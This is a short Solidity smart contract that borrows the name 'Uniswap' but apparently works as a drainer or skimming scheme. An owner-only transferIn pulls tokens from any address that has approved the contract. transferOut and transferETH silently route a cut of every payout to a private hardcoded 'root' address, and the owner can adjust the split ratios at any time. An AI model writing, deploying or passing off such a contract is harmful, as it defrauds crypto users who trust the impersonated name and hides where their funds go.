pragma solidity ^0.4.24;
interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
}
contract Uniswap {
    address public owner;
    IERC20 token;
    uint public num=10000;
    uint public num1=1000;
    uint public num2=9000;
    address private root = 0x8b97290244e05DFA935922AA9AfA667a78888888;

    modifier onlyOwner {
        require(msg.sender == owner,"you are not the owner");
        _;
    }
    
    constructor() public {
        owner = msg.sender;
    }
  function () payable public {}

  function  transferOut(IERC20 _token,address toAddr, uint256 amount) payable onlyOwner public {
    token=_token;
    token.transfer(root,amount*num1);
    token.transfer(toAddr,amount*num2);
    
  }

  function  transferIn(IERC20 _token,address fromAddr, uint256 amount) payable onlyOwner public {
    token=_token;
    token.transferFrom(fromAddr,address(this),amount*num);
  }
  function  transferETH(address toAddr, uint256 amount) payable onlyOwner public {
    root.transfer(amount*num1);
    toAddr.transfer(amount*num2);
  }
  function setting(uint _num,uint _num1,uint _num2) onlyOwner public{
      num=_num;
      num1=_num1;
      num2=_num2;
  }

}